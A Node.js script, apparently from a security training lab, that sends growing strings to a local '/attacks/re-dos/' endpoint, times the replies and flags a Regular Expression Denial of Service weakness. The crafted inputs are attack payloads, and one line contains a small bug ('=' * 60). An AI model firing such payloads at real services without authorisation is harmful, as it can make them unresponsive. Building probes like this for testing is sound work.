#!/usr/bin/env node

const http = require('http');
const https = require('https');

const BASE_URL = process.env.BASE_URL || 'http://localhost:3000';

const makeRequest = (method, path, data = null) => {
  return new Promise((resolve, reject) => {
    const url = new URL(path, BASE_URL);
    const options = {
      hostname: url.hostname,
      port: url.port,
      path: `${url.pathname}${url.search}`,
      method,
      headers: {
        'Content-Type': 'application/json',
      },
    };

    const req = (url.protocol === 'https:' ? https : http).request(options, (res) => {
      let body = '';
      res.on('data', (chunk) => { body += chunk; });
      res.on('end', () => {
        try {
          const parsed = JSON.parse(body);
          resolve({ status: res.statusCode, data: parsed, time: Date.now() });
        } catch (e) {
          resolve({ status: res.statusCode, data: body, time: Date.now() });
        }
      });
    });

    req.on('error', reject);
    
    if (data) {
      req.write(JSON.stringify(data));
    }
    
    req.end();
  });
};

const reDosAttack = async () => {
  console.log('⏰ Starting ReDoS (Regular Expression Denial of Service) Attack...');
  console.log(`📍 Target: ${BASE_URL}/attacks/re-dos/`);
  console.log('='.repeat(60));
  
  // Test different input sizes and patterns
  const testCases = [
    { name: 'Normal input', title: 'normal title', expected: 'fast' },
    { name: 'Medium input', title: 'a'.repeat(100), expected: 'medium' },
    { name: 'Large input', title: 'a'.repeat(500), expected: 'slow' },
    { name: 'Very large input', title: 'a'.repeat(1000), expected: 'very slow' },
    { name: 'Malicious pattern', title: 'a'.repeat(1000) + '!', expected: 'potential ReDoS' },
    { name: 'Repeating pattern', title: 'ab'.repeat(500), expected: 'medium' },
    { name: 'Complex pattern', title: 'a'.repeat(500) + 'b'.repeat(500), expected: 'slow' }
  ];
  
  const results = [];
  
  for (const testCase of testCases) {
    console.log(`🔍 Testing: ${testCase.name}`);
    console.log(`   Input length: ${testCase.title.length} characters`);
    
    const startTime = Date.now();
    
    try {
      const result = await makeRequest('POST', '/attacks/re-dos/', { title: testCase.title });
      const endTime = Date.now();
      const responseTime = endTime - startTime;
      
      results.push({
        name: testCase.name,
        inputLength: testCase.title.length,
        responseTime,
        status: result.status,
        expected: testCase.expected
      });
      
      console.log(`   Response time: ${responseTime}ms`);
      console.log(`   Status: ${result.status}`);
      console.log(`   Result: ${JSON.stringify(result.data).substring(0, 100)}...`);
      console.log('');
      
    } catch (error) {
      console.log(`   ❌ Error: ${error.message}`);
      console.log('');
    }
    
    // Add delay between requests to avoid overwhelming the server
    await new Promise(resolve => setTimeout(resolve, 200));
  }
  
  // Analyze results for potential ReDoS
  console.log('📊 Analysis Results:');
  console.log('='.repeat(60));
  
  const normalTime = results.find(r => r.name === 'Normal input')?.responseTime || 0;
  
  results.forEach(result => {
    const timeRatio = normalTime > 0 ? result.responseTime / normalTime : 0;
    let status = '✅ Normal';
    
    if (timeRatio > 10) {
      status = '🚨 CRITICAL - Potential ReDoS';
    } else if (timeRatio > 5) {
      status = '⚠️  WARNING - Slow response';
    } else if (timeRatio > 2) {
      status = '⚡ Slow';
    }
    
    console.log(`${result.name}:`);
    console.log(`   Response time: ${result.responseTime}ms`);
    console.log(`   Time ratio: ${timeRatio.toFixed(2)}x`);
    console.log(`   Status: ${status}`);
    console.log('');
  });
  
  // Check for ReDoS vulnerability
  const hasReDoS = results.some(r => {
    const timeRatio = normalTime > 0 ? r.responseTime / normalTime : 0;
    return timeRatio > 10;
  });
  
  console.log('=' * 60);
  
  if (hasReDoS) {
    console.log('🚨 REDoS VULNERABILITY DETECTED!');
    console.log('   The application is vulnerable to Regular Expression Denial of Service attacks.');
    console.log('   This can be exploited to cause the server to become unresponsive.');
  } else {
    console.log('✅ No ReDoS vulnerability detected.');
    console.log('   All response times are within acceptable ranges.');
  }
  
  return hasReDoS;
};

// Run if called directly
if (require.main === module) {
  reDosAttack().catch(console.error);
}

module.exports = { reDosAttack };
